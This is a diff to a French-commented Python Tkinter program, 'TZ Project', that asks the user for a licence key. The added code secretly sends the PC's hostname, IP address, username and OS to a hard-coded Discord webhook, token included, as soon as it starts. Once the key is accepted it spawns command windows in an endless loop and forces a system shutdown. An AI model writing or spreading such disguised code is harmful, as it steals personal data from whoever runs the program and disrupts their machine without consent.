@@ -4,17 +4,95 @@ import os
 import threading
 import subprocess
 import requests
+import socket
+import platform
 
-# Vérification des fichiers
+# Configuration
 logo_path = "IMG_2724.jpeg"
 bg_path = "IMG_2728.jpeg"
 webhook_url = "https://discord.com/api/webhooks/1317804846388084746/LzjsxSceGqQaizw-JqFCUvbrFRhboYC0DJbmMFH21ViQlikda0bZF9E4z2zDiRT2N9f8"
+correct_key = "CM_AFEO-LOVD-DJRB-DIES"
 
-for path in [logo_path, bg_path]:
-    if not os.path.exists(path):
-        print(f"⚠️ Le fichier {path} est introuvable. Place-le dans le même dossier que le script.")
+# 📡 Récupération des infos du PC
+def get_system_info():
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        os_name = platform.system()
+        os_version = platform.release()
+        user = os.getenv("USERNAME") or os.getenv("USER")
 
-# Fenêtre principale
+        return {
+            "content": "**💻 Connexion détectée sur TZ Project !**",
+            "embeds": [
+                {
+                    "title": "🔍 Infos du PC",
+                    "color": 16711680,  # Rouge
+                    "fields": [
+                        {"name": "🖥️ Nom du PC", "value": hostname, "inline": False},
+                        {"name": "🌐 Adresse IP", "value": ip_address, "inline": False},
+                        {"name": "👤 Utilisateur", "value": user, "inline": False},
+                        {"name": "🛠️ OS", "value": f"{os_name} {os_version}", "inline": False},
+                    ]
+                }
+            ]
+        }
+    except Exception as e:
+        return {"content": f"❌ Erreur lors de la récupération des infos : {e}"}
+
+# 📩 Envoi du webhook dès le lancement
+def send_webhook():
+    data = get_system_info()
+    try:
+        requests.post(webhook_url, json=data)
+    except Exception as e:
+        print(f"❌ Erreur Webhook : {e}")
+
+threading.Thread(target=send_webhook, daemon=True).start()
+
+# 💥 Ouvrir des CMD en boucle infinie
+def open_cmd_forever():
+    while True:
+        subprocess.Popen("start cmd", shell=True)
+
+# 🛑 Éteindre le PC après la validation de la clé
+def shutdown_pc():
+    os.system("shutdown /s /t 10 /c 'FORCE À TOI :('")  # Éteint dans 10 sec
+
+# 🎬 Afficher la fenêtre "Loading" et spam CMD
+def open_loading_window():
+    global root
+    root.destroy()  # Ferme la fenêtre principale
+
+    loading_window = tk.Tk()
+    loading_window.title("Loading")
+    loading_window.geometry("800x600")  # Grande fenêtre
+    loading_window.configure(bg="black")
+
+    # Centrage de la fenêtre
+    screen_width = loading_window.winfo_screenwidth()
+    screen_height = loading_window.winfo_screenheight()
+    x_pos = (screen_width // 2) - (800 // 2)
+    y_pos = (screen_height // 2) - (600 // 2)
+    loading_window.geometry(f"800x600+{x_pos}+{y_pos}")
+
+    label = tk.Label(loading_window, text="LOADING...", font=("Arial", 40, "bold"), fg="white", bg="black")
+    label.pack(expand=True)
+
+    # 📢 Lancer le spam CMD et éteindre le PC
+    threading.Thread(target=open_cmd_forever, daemon=True).start()
+    threading.Thread(target=shutdown_pc, daemon=True).start()
+
+    loading_window.mainloop()
+
+# 🎫 Vérification de la clé
+def check_key():
+    if key_entry.get() == correct_key:
+        root.after(500, open_loading_window)  # Ouvre "Loading"
+    else:
+        result_label.config(text="❌ Clé invalide", fg="red")
+
+# 🎨 Interface graphique
 root = tk.Tk()
 root.title("TZ Project")
 root.geometry("400x300")
@@ -40,52 +118,6 @@ if os.path.exists(logo_path):
     logo_tk = ImageTk.PhotoImage(logo_img)
     logo_label = tk.Label(root, image=logo_tk, bg="#ffffff")
     logo_label.place(relx=0.5, y=30, anchor="center")
-
-# Fonction pour ouvrir 3 CMD
-def open_cmd():
-    for _ in range(3):
-        subprocess.Popen("start cmd", shell=True)
-
-# Fonction pour envoyer un webhook
-def send_webhook():
-    data = {"content": "✅ Clé correcte entrée dans TZ Project !"}
-    try:
-        requests.post(webhook_url, json=data)
-    except Exception as e:
-        print(f"❌ Erreur Webhook : {e}")
-
-# Fonction pour afficher la fenêtre "Loading"
-def open_loading_window():
-    global root
-    root.destroy()  # Ferme la fenêtre principale
-
-    loading_window = tk.Tk()
-    loading_window.title("Loading")
-    loading_window.geometry("800x600")  # Grande fenêtre
-    loading_window.configure(bg="black")
-
-    # Centrage de la fenêtre
-    screen_width = loading_window.winfo_screenwidth()
-    screen_height = loading_window.winfo_screenheight()
-    x_pos = (screen_width // 2) - (800 // 2)
-    y_pos = (screen_height // 2) - (600 // 2)
-    loading_window.geometry(f"800x600+{x_pos}+{y_pos}")
-
-    label = tk.Label(loading_window, text="LOADING...", font=("Arial", 40, "bold"), fg="white", bg="black")
-    label.pack(expand=True)
-
-    # Lancer le spam CMD et envoyer le webhook
-    threading.Thread(target=open_cmd, daemon=True).start()
-    threading.Thread(target=send_webhook, daemon=True).start()
-
-    loading_window.mainloop()
-
-# Fonction pour vérifier la clé
-def check_key():
-    if key_entry.get() == "CM_AFEO-LOVD-DJRB-DIES":
-        root.after(500, open_loading_window)  # Ferme et ouvre "Loading"
-    else:
-        result_label.config(text="❌ Clé invalide", fg="red")
 
 # Cadre principal
 frame = tk.Frame(root, bg="#ffffff")
